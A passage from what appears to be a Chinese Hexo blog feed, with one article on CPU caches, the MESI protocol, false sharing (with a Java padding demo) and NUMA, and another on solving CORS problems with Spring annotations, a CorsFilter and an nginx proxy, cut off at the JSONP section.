Cache)通常只有32~64KB的容量，这个容量远远不能满足CPU大量、告诉存取的需求。此外，由于存储性能的答复提升往往伴随着价格的同步飙升，所以出于对整体成本的控制，现实中往往采用金字塔形的多级Cache体系来实现最佳缓存效果，于是出现了二级Cache(L2 Cache)及三级Cache(L3 Cache)，每一级Cache都牺牲了部分性能指标来换取更大的容量，目的是缓存更多的热点数据。以Intel家族 Intel Sandy Bridge架构的CPU为例，其L1 Cache容量为64KB，访问速度为1ns左右；L2 Cache容量扩大4倍，达到256KB，访问速度则降低到3ns左右；L3 Cache的容量则扩大512倍，达到32MB，访问速度也下降到12ns左右，即使如此，也比访问驻村的100ns(40ns+65ns)快一个数量级。此外，L3 Cache是被一个Socket上的所有CPU Core共享的，其实最早的L3 Cache被应用在AMD发布的K6-III处理器上，当时的L3 Cache受限于制造工艺，并没有被集成到CPU内部，而是集成到主板上。</p><p>&nbsp; &nbsp;从Intel Sandy Bridge CPU架构图中可以看出，CPU如果要访问内存中的数据，则要经过L1、L2、L3这三道关卡后才能抵达目的地，这个过程并不是「皇上」(CPU)亲自出马，而是交由3个级别的贵妃(Cache)们层层转发「圣旨」(内部指令)，最红抵达「后宫」(内存).</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/srqxnc_1.png" alt="1565571049876"></p><hr><h3 id="多核CPU与内存共享的问题"><a href="#多核CPU与内存共享的问题" class="headerlink" title="多核CPU与内存共享的问题"></a>多核CPU与内存共享的问题</h3><p>&nbsp; &nbsp;在多核CPU的情况下，如何共享内存？</p><p>&nbsp; &nbsp;如果擅长多线程高级编程，那么肯定会毫不犹豫地给出以下伪代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">synchronized</span>(memory)&#123;</span><br><span class="line">    doSomething(...);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&nbsp; &nbsp;如果真这个简单，那么这个世界上就不会只剩下两家独大的主流CPU制造商了，而且可怜的AMD一直被Intel「吊打」。</p><p>&nbsp; &nbsp;多核CPU共享内存的问题也被称为Cache一致性问题，简单地说，就是多个CPU核心所看到的Cache数据应该是一直的，在某个数据被某个CPU写入自己的Cache(L1 Cache)以后，其他CPU都应该能看到相同的Cache数据；如果自己的Cache中有旧数据，则抛弃旧数据。考虑到每个CPU有自己内存独占的Cache，所以这个问题与分布式Cache保持同步的问题是同一类问题。来自Intel的MESI协议是目前业界公认的Cache一致性问题的最佳方案，大多数SMP架构都采用这一方案，虽然该协议是一个CPU内部的协议，但由于它对我们理解内存模型及解决分布式系统的数据一致性问题有重要的参考价值，所以在这对其进行简单介绍。</p><p>&nbsp; &nbsp;Cache Line，如果有印象的话，则你会发现I/O操作从来不以字节为单位，而是以「块」为单位，这里有两个原因：首先，因为I/O操作比较慢，所以读一个字节与一个读连续N个字节所花费的时间基本相同；其次，数据访问往往具有空间连续性地特征，即我们通常会访问空间上连续的一些数据。举个例子，访问数组时通常会循环遍历，比如查找某个值或者进行比较等，如果把数组中连续的几个字节都读到内存中，那么CPU的处理速度会提升几倍。对于CPU来说，由于Memory也是慢速的外部组件，所以针对Memory的读写也采用类似I/O块的方式就不足为奇了。实际上，CPU Cache里的最小存储单元就是Cache Line，Intel CPU的一个Cache Line存储64个字节，每一级Cache都被划分为很多组Cache Line，典型的情况是4条Cache Line为一组，当Cache从Memory中加载数据时，一次加载一条Cache Line的数据。下图是Cache的结构。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/srqxnc_2.png" alt="1565572262318"></p><p>&nbsp; &nbsp;每个Cache Line的头部有两个Bit来表示自身的状态，总共4种状态。</p><blockquote><ul><li>M（Modified）：修改状态，其他CPU上没有数据的副本，并且在本CPU上被修改过，与存储器中的数据不一致，最终必然会引发系统总线的写指令，将Cache Line的数据写回到Memory中。</li><li>E(Exclusive)：独占状态，表示当前Cache Line中包含的数据与Memory中的数据一致，此外，其他CPU中没有数据的副本。</li><li>S（Shared）：共享状态，表示Cache Line中包含的数据与Memory中的数据一致，而且在当前CPU和至少在其他某个CPU中有副本。</li><li>I(Invalid)：无效状态，当前Cache Line中没有有效数据或该Cache Line的数据已经失效，不能再用，当Cache要加载新数据时，优先选择此状态的Cache Line，此外，Cache Line的初始状态也是I状态。</li></ul></blockquote><p>&nbsp; &nbsp;MESI协议是用Cache Line的上述4种状态命名的，对Cache的读写操作引发了Cache Line的状态变化，因而可以理解为一种状态机模型。但MESI的复杂和独特之处在于状态的两种视角：一种是当前读写操作(Local Read/Write)所在CPU看到的自身的Cache Line状态及其他CPU上对应的Cache Line状态；另一种是一个CPU上的Cache Line状态的变迁会导致其他CPU上对应的Cache Line的状态变迁。如下所示为MESI协议的状态图。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/srqxnc_3.png" alt="1565573021589"></p><p>&nbsp; &nbsp;结合状态图，我们深入分析MESI协议的一些实现细节。</p><p>&nbsp; &nbsp;（1）某个CPU(CPU A)发起本地读请求(Local Read)，比如读取某个内存地址的变量，如果此时所有的CPU的Cache中都没有加载此内存地址，即此内存地址对应的Cache Line为无效状态(Invalid)，则CPU A中的Cache会发起一个到Memory的内存Load指令，在相应的Cache Line中完成内存加载后，此Cache Line的状态会被标记位Exclusive。接下来，如果其他CPU(CPU B)在总线上也发起对同一个内存地址的读请求，则这个读请求会被CPU A 嗅探到(SNOOP),然后CPU A在内存总线上复制一份Cache Line作为应答，并将自身的Cache Line状态改为Shared，同时CPU B收到来自总线的应答并保存到自己的Cache里，也修改对应的Cache Line 状态为Shared。</p><p>&nbsp; &nbsp;(2)某个CPU(CPU A)发起本地写请求(Loacl Write),比如对某个内存地址的变量赋值，如果此时多有的CPU的Cache中都没加载此内存地址，即此内存对应的Cache Line为无效状态(Invalid)，则CPU A 中的Cache Line保存了最新的内存变量值后，其祖航太修改为Modified。随后，如果CPU B发起对同一个变量的读操作(Remote Read)，则CPU A在总线嗅探到这个读请求以后，先将Cache Line里修改过的数据回写(Write Back)到Memory中，然后在内存总线上复制一份Cache Line作为应答，最后将自身的Cache Line状态修改为Shared，由此产生的结果是CPU A与CPU B里对应的Cache Line状态都为Shared。</p><p>&nbsp; &nbsp;(3)以上面第二条内容为基础，CPU A发起本地写请求并导致自身的Cache Line状态变为Modified，如果此时CPU B 发起同一个内存地址的写请求(Remote Write)，则我们看到的状态图里此时CPU A 的Cache Line状态为Invalid 其原因如下。</p><p>&nbsp; &nbsp;CPU B此时发出的是一个特殊的请求——读并且打算修改数据，当CPU A从总线上嗅探到这个请求后，会先阻止此请求并取得总线的控制权( Takes Control of Bus)，随后将Cache Line里修改过的数据回写到Memory中，再将此Cache Line的状态修改为Invalid(这是因为其他CPU要改数据，所以没必要改为Shared)。与此同时，CPU B 发现之前的请求并没有得到响应，于是重新发起一次请求，此时由于所有的CPU的Cache里都没有内存副本了，所以CPU B的Cache就从Memory中加载最新的数据到Cache Line中，随后修改数据，然后改变Cache Line的状态为Modified。</p><p>  &nbsp; &nbsp;(4)如果内存中的某个变量被多个CPU加载到各自的Cache中，从而使得变量对应的Cache Line状态为Shared，若此时某个CPU打算对此变量进行写操作，则会导致所有拥有此变量缓存的CPU的Cache Line状态都变为Invalid，这是引发性能下降的一个典型Cache Miss 问题。</p><p>  &nbsp; &nbsp;在理解了MESI协议以后，我们明白了一个重要的事实，即存在多个处理器时，对共享变量的修改操作会设计多个CPU之间协调问题及Cache失效问题，这就引发了著名的「Cache伪共享」问题。</p><p>   &nbsp; &nbsp;如果要访问的数据不在CPU的运算单元里，则需要从缓存中加载，如果缓存中恰好有此数据而且数据有效，就命中一次(Cache Hit)，反之产生一次Cache Miss ，此时需要从下一级缓存或主存中再次尝试加载。根据之前的分析，如果发生了Cache Miss，则数据的访问性能瞬间下降很多！在我们需要大量加载运算的情况下，数据结构、访问方式及程序运算方面是否符合「缓存友好」的设计，就成为「量变引起质变」得关键性因素了。这也是为什么最近，国外很多大数据领域的专家都热衷于研究设计和采用新一代的数据结构和算法，而其核心之一就是「缓存友好」。</p><hr><h3 id="著名的Cache伪共享问题"><a href="#著名的Cache伪共享问题" class="headerlink" title="著名的Cache伪共享问题"></a>著名的Cache伪共享问题</h3><p>&nbsp; &nbsp;Cache伪共享问题是编程中真实存在的一个问题，考虑如下所示的Java Class结构：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyObject</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">long</span> a;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">long</span> b;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">long</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> &nbsp; &nbsp; 按照java规范,MyObject的对象是在堆内存上分配空间存储的，而且a、b、c三个属性在内存空间上是邻近，如下所示。</p><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td>a(8个字节)</td><td>b（8个字节）</td><td>c(8个字节)</td></tr></tbody></table><p> &nbsp; &nbsp;我们知道，X86的CPU中Cache Line的长度为64字节，这也就意味着MyObject的3个属性(长度之和为24字节)是完全可能加载在一个Cache Line里的。如此一来，如果我们有两个不同的线程(分别运行在两个CPU上)分别同时独立修改a与b这两个属性，那么这两个CPU上的Cache Line可能出现如下所示的情况，即a与b这两个变量被放入同一个Cache Line里，并且被两个不同的CPU共享。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/srqxnc_4.png" alt="1566381303626"></p><p>&nbsp; &nbsp;根据上节中MESI协议的相关知识，我们知道，如果Thread 0要对a变量进行修改，则因为CPU 1 上有对应的Cache Line ， 这会导致CPU 1 的Cache Line 无效，从而使得Thread 1 被迫重新从Memory里获取b的内容(b并没有被其他CPU改变，这样做是因为b与a在一个Cache Line里)。同样，如果Thread 1 要对b变量进行修改，则同样导致Thread 0 的Cache Line 失效，不得不重新从Memory里加载a。如此一来，本来是逻辑上无关的两个线程，完全可以在两个不同的CPU上同时执行，但阴差阳错地共享了同一个Cache Line 并相互抢占资源，导致并形成为串行，大大降低了系统的并发性，这就是所谓的Cache伪共享。</p><p>&nbsp; &nbsp;解决Cache伪共享问题的方法很简单，将a与b两个变量分到不同的Cache Line里，通常可以用一些无用的字段填充a与b之间的空隙。由于伪共享问题对性能的影响比较大，所以JDK 8 首次提供了正式的普适性的方案，即采用@Contended注解来确保一个Object或者Class里的某个属性与其他属性不在一个Cache Line里，下面的VolatileLong的多个实例之间就不会产生Cache伪共享的问题：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Contended</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">VolatileLong</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">volatile</span> <span class="keyword">long</span> value = <span class="number">0L</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font color=red> 伪共享的代码例子在代码 jvm.CacheLinePadding中，全部代码地址：<a href="https://github.com/yccjack/SimpleTuning">SimpleTuning</a></font>具体如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.concurrent.CountDownLatch;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> ycc</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@time</span> 14:43</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CacheLinePadding</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> count = <span class="number">100000000</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 测试缓存行是否存在，</span></span><br><span class="line"><span class="comment">     * 这里使用InnerNo作为测试缓存行的类，缓存行默认使用64字节，这里一个long是8字节，当注释f1......后，会出现伪共享，证明缓存行的存在。 把注释打开后 耗时与不适用volatile差不多，消除了缓存行的问题，</span></span><br><span class="line"><span class="comment">     * 进而消除了伪共享问题。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">InnerNo</span></span>&#123;</span><br><span class="line">       <span class="comment">// private long f1,f2,f3,f4,f5,f6,f7;</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">volatile</span> <span class="keyword">long</span> s =<span class="number">1</span>;</span><br><span class="line">        <span class="comment">//private long f8,f9,f10,f11,f12,f13,f14;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span>  InnerNo[] arr;</span><br><span class="line">    <span class="keyword">static</span>  &#123;</span><br><span class="line">        arr  =<span class="keyword">new</span> InnerNo[<span class="number">2</span>];</span><br><span class="line">        arr[<span class="number">0</span>]=<span class="keyword">new</span> InnerNo();</span><br><span class="line">        arr[<span class="number">1</span>]=<span class="keyword">new</span> InnerNo();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">         CountDownLatch downLatch = <span class="keyword">new</span> CountDownLatch(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        Thread t1 = <span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;count ; i++) &#123;</span><br><span class="line">                arr[<span class="number">0</span>].s = i;</span><br><span class="line">            &#125;</span><br><span class="line">            downLatch.countDown();</span><br><span class="line">        &#125;);</span><br><span class="line">        Thread t2= <span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;count ; i++) &#123;</span><br><span class="line">                arr[<span class="number">1</span>].s = i;</span><br><span class="line">            &#125;</span><br><span class="line">            downLatch.countDown();</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">long</span> start = System.nanoTime();</span><br><span class="line">        t1.start();</span><br><span class="line">        t2.start();</span><br><span class="line">        downLatch.await();</span><br><span class="line">        System.out.println(<span class="string">&quot;耗时：&quot;</span>+(System.nanoTime()-start)/<span class="number">1000000</span>+<span class="string">&quot;s&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="深入理解不一致性内存"><a href="#深入理解不一致性内存" class="headerlink" title="深入理解不一致性内存"></a>深入理解不一致性内存</h3><p>&nbsp; &nbsp;MESI协议解决了多核CPU下的Cache一致性问题，因而成为SMP架构的唯一选择。SMP架构近几年迅速在PC领域(X86)发展，一个CPU芯片上集成的CPU核心数量越来越多，到2017年，AMD的ZEN系列处理器就已经达到16核心32线程了。SMP架构是一种平行的结果，所有CPU Core都连接到一个内存总线上，他们平等访问内存，同时整个内存是统一结构、统一寻址的(Uniform Memory Architecture , UMA)。如下所示给出了SMP架构的示意图。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/srqxnc_5.png" alt="1566382149967"></p><p>&nbsp; &nbsp;但是，随着CPU核心数量的不断增长，SMP架构也暴露其天生的短板，其根本瓶颈是共享内存总线的宽带无法满足CPU数量的增加，同时，一条「马路」上同行的「车」多了，难免陷入「拥堵模式」。在这种情况下，分布式解决方案应运而生，系统的内存与CPU进行分割并绑定在一起，形成多个独立的子系统，这些子系统之间高速互连，这就是所谓的NUMA（None Uniform Memory Architecture）架构，如下图所示：</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/srqxnc_6.png" alt="1566382356771"></p><p>&nbsp; &nbsp;我们可以认为NUMA架构第1次打破了「大锅饭」的模式，内存不在是一个整体，而是被分割为互相独立的几块，被不同的CPU私有化(Attach到不同的CPU上)。因此，当CPU访问自身私有的内存地址时（Local Access），会很快得到响应，而如果需要访问其他CPU控制的内存数据（Remote Access），则需要通过某种互连通道（Inter-connect通道）访问，响应时间与之前相对变慢。NUMA的主要优点是伸缩性，NUMA的这种体系结构在设计上已经超越了SMP，可以扩展到几百个CPU而不会导致性能的严重下降。</p><p>&nbsp; &nbsp;NUMA技术最早出现出现在20世纪80年代，主要运行在一些大中型UNIX系统中，Sequent公司是世界公认的NUMA技术领袖。早在1986年，Sequent公司就率先利用微处理器构建大型系统，开发了基于UNIX的SMP体系结构，开创了业界转入SMP领域的先河。1999年9月，IBM公司收购了Sequent公司，将NUMA技术集成到IBM UNIX阵营中，并推出了能够支持和扩展Intel平台的NUMA-Q系统及方案，为全球大型企业客户适应高速发展的电子商务市场提供了更加多样化、高可扩展性及易于管理的选择，成为NUMA技术的领先开发者与革新者。随后很多老牌UNIX服务器厂商也采用了NUMA技术，例如IBM、Sun、惠普、Unisys、SGI等公司。2000年全球互联网泡沫破灭后，X86+Linux系统开始以低廉的成本侵占UNIX的底盘，AMD率先在其AMD Opteron 系列处理器中的X86 CPU上实现了NUMA架构，Intel也跟进并在Intel Nehalem中实现了NUMA架构（Intel服务器芯片志强E5500以上的CPU和桌面的i3、i5、i7均采用此架构），至此NUMA这个贵族技术开始真正走入平常百姓家。</p><p>&nbsp; &nbsp;下面详细分析一下NUMA技术的特点。首先，NUMA架构中引入了一个重要的新名词——Node，一个Node由一个或者多个Socket组成，即物理上的一个或多个CPU芯片组成一个逻辑上的Node。如下所示为来自Dell PowerEdge系统服务器的说明手册中的NUMA的图片，4个Intel Xeon E 5-4600处理器形成4个独立的NUMA Node，由于每个Intel Xeon E 5-4600为8Core，支持双线程，所以每个Node里的Logic CPU数量为16个，占每个Node分配系统总内存1/4，每个Node之间通过Intel QPI（QuickPath Interconnect）技术形成了点到点的全互连处理器系统。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/srqxnc_7.png" alt="1566383334597"></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>跨域问题</title>
      <link href="/cros/"/>
      <url>/cros/</url>
      
        <content type="html"><![CDATA[<p>前后端分离跨域问题的几种解决方案.为什么会出现跨域问题?出于浏览器的同源策略限制。 同源策略（Sameoriginpolicy）是一种约定，它是浏览器最核心也最基本的安全功能，如果缺少了同源策略，则浏览器的正常功能可能都会受到影响。可以说Web是构建在同源策略基础之上的，浏览器只是针对同源策略的一种实现。同源策略会阻止一个域的javascript脚本和另外一个域的内容进行交互。所谓同源（即指在同一个域）就是两个页面具有相同的协议（protocol），主机（host）和端口号（port） 。</p> <a id="more"></a><h1 id="跨域问题"><a href="#跨域问题" class="headerlink" title="跨域问题"></a>跨域问题</h1><blockquote><p>作者：cnsyear</p><p>链接 ：<a href="https://cnsyear.com/posts/a74bc789.html">https://cnsyear.com/posts/a74bc789.html</a></p></blockquote><h1 id="前后端分离跨域问题的几种解决方案"><a href="#前后端分离跨域问题的几种解决方案" class="headerlink" title="前后端分离跨域问题的几种解决方案"></a>前后端分离跨域问题的几种解决方案</h1><blockquote><p>前后端分离跨域问题的几种解决方案</p></blockquote><h2 id="一、为什么会出现跨域问题"><a href="#一、为什么会出现跨域问题" class="headerlink" title="一、为什么会出现跨域问题?"></a>一、为什么会出现跨域问题?</h2><p>出于浏览器的同源策略限制。</p><blockquote><p>同源策略（Sameoriginpolicy）是一种约定，它是浏览器最核心也最基本的安全功能，如果缺少了同源策略，则浏览器的正常功能可能都会受到影响。可以说Web是构建在同源策略基础之上的，浏览器只是针对同源策略的一种实现。同源策略会阻止一个域的javascript脚本和另外一个域的内容进行交互。所谓同源（即指在同一个域）就是两个页面具有相同的协议（protocol），主机（host）和端口号（port） 。</p></blockquote><h2 id="二、什么是跨域"><a href="#二、什么是跨域" class="headerlink" title="二、什么是跨域?"></a>二、什么是跨域?</h2><p>当一个请求url的协议、域名、端口三者之间任意一个与当前页面url不同即为跨域。</p><table><thead><tr><th>当前页面url</th><th>被请求页面url</th><th>是否跨域</th><th>原因</th></tr></thead><tbody><tr><td><a href="http://www.test.com/">http://www.test.com/</a></td><td><a href="http://www.test.com/index.html">http://www.test.com/index.html</a></td><td>否</td><td>同源（协议、域名、端口号相同）</td></tr><tr><td><a href="http://www.test.com/">http://www.test.com/</a></td><td><a href="https://www.test.com/index.html">https://www.test.com/index.html</a></td><td>跨域</td><td>协议不同（http/https）</td></tr><tr><td><a href="http://www.test.com/">http://www.test.com/</a></td><td><a href="http://www.baidu.com/">http://www.baidu.com/</a></td><td>跨域</td><td>主域名不同（test/baidu）</td></tr><tr><td><a href="http://www.test.com/">http://www.test.com/</a></td><td><a href="http://blog.test.com/">http://blog.test.com/</a></td><td>跨域</td><td>子域名不同（www/blog）</td></tr><tr><td><a href="http://www.test.com:8080/">http://www.test.com:8080/</a></td><td><a href="http://www.test.com:7001/">http://www.test.com:7001/</a></td><td>跨域</td><td>端口号不同（8080/7001）</td></tr></tbody></table><p>两个相同的源之间浏览器默认其是可以相互访问资源和操作DOM的。<br>两个不同的源之间 若想要相互访问资源或者操作DOM，那么会有一套基础的安全策略的制约。<br>具体有如下两方面的限制:</p><ul><li>1.安全性：浏览器要防止当前站点的私密数据不会向其他站点发送 如当前站点的Cookie,LocalStorage,IndexDb不会被发送到其他站点或被其他站点脚本读取到无法跨域获取Dom，无法发送Ajax请求。</li><li>2.可用性：大型站点的图片，音视频等资源，希望部署在独立服务器上，为缓解当前服务的压力，开放某些特定的方式，访问非同源站点 如：<code>&lt;img&gt;&lt;iframe&gt;&lt;link&gt;&lt;vedio&gt;</code>等，可以同src属性跨域访问允许跨域提交表单/或重定向请求。</li></ul><h2 id="三、解决方案"><a href="#三、解决方案" class="headerlink" title="三、解决方案"></a>三、解决方案</h2><h3 id="1-后台服务端解决方案"><a href="#1-后台服务端解决方案" class="headerlink" title="1.后台服务端解决方案"></a>1.后台服务端解决方案</h3><ul><li>方法一：@CrossOrigin</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">复制&#x2F;**</span><br><span class="line">注意：</span><br><span class="line">1、springMVC的版本要在4.2或以上版本才支持@CrossOrigin</span><br><span class="line">2、非@CrossOrigin没有解决跨域请求问题，而是不正确的请求导致无法得到预期的响应，导致浏览器端提示跨域问题。</span><br><span class="line">3、在Controller注解上方添加@CrossOrigin注解后，仍然出现跨域问题，</span><br><span class="line">解决方案之一就是：在@RequestMapping注解中没有指定Get、Post方式，具体指定后，问题解决。</span><br><span class="line"></span><br><span class="line">其中@CrossOrigin中的2个参数：</span><br><span class="line">origins  ： 允许可访问的域列表</span><br><span class="line">maxAge：准备响应前的缓存持续的最大时间（以秒为单位）。</span><br><span class="line"></span><br><span class="line">可以配置在Controller上 也可以配置在方法上</span><br><span class="line">*&#x2F;</span><br><span class="line">@CrossOrigin</span><br><span class="line">@RestController</span><br><span class="line">public class person&#123;</span><br><span class="line">    </span><br><span class="line">    @RequestMapping(method &#x3D; RequestMethod.GET)</span><br><span class="line">    public String add() &#123;</span><br><span class="line">        &#x2F;&#x2F; 若干代码</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@RestController</span><br><span class="line">@RequestMapping(&quot;&#x2F;account&quot;)</span><br><span class="line">public class AccountController &#123;</span><br><span class="line"></span><br><span class="line">    @CrossOrigin</span><br><span class="line">    @GetMapping(&quot;&#x2F;&#123;id&#125;&quot;)</span><br><span class="line">    public Account retrieve(@PathVariable Long id) &#123;</span><br><span class="line">        &#x2F;&#x2F; ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>方法2</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">复制package cn.pconline.pcloud.admin.config;</span><br><span class="line"></span><br><span class="line">import org.springframework.context.annotation.Bean;</span><br><span class="line">import org.springframework.context.annotation.Configuration;</span><br><span class="line">import org.springframework.web.cors.CorsConfiguration;</span><br><span class="line">import org.springframework.web.cors.UrlBasedCorsConfigurationSource;</span><br><span class="line">import org.springframework.web.filter.CorsFilter;</span><br><span class="line"></span><br><span class="line">@Configuration</span><br><span class="line">public class CorsConfig &#123;</span><br><span class="line">    private CorsConfiguration buildConfig() &#123;</span><br><span class="line">        CorsConfiguration corsConfiguration &#x3D; new CorsConfiguration();</span><br><span class="line">        corsConfiguration.addAllowedOrigin(&quot;*&quot;); &#x2F;&#x2F; 1允许任何域名使用</span><br><span class="line">        corsConfiguration.addAllowedHeader(&quot;*&quot;); &#x2F;&#x2F; 2允许任何头</span><br><span class="line">        corsConfiguration.addAllowedMethod(&quot;*&quot;); &#x2F;&#x2F; 3允许任何方法（post、get等）</span><br><span class="line">        return corsConfiguration;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Bean</span><br><span class="line">    public CorsFilter corsFilter() &#123;</span><br><span class="line">        UrlBasedCorsConfigurationSource source &#x3D; new UrlBasedCorsConfigurationSource();</span><br><span class="line">        source.registerCorsConfiguration(&quot;&#x2F;api&#x2F;**&quot;, buildConfig()); &#x2F;&#x2F; 4</span><br><span class="line">        return new CorsFilter(source);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-Nginx代理服务器，反向代理接口请求"><a href="#2-Nginx代理服务器，反向代理接口请求" class="headerlink" title="2.Nginx代理服务器，反向代理接口请求"></a>2.Nginx代理服务器，反向代理接口请求</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">复制location &#x2F;api&#123; </span><br><span class="line">  rewrite ^&#x2F;api&#x2F;(.*)$ &#x2F;$1 break;</span><br><span class="line">  proxy_pass http:&#x2F;&#x2F;localhost:8081&#x2F;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-jsonp方式"><a href="#3-jsonp方式" class="headerlink" title="3.jsonp方式"></a>3.jsonp方式</h3><p><a 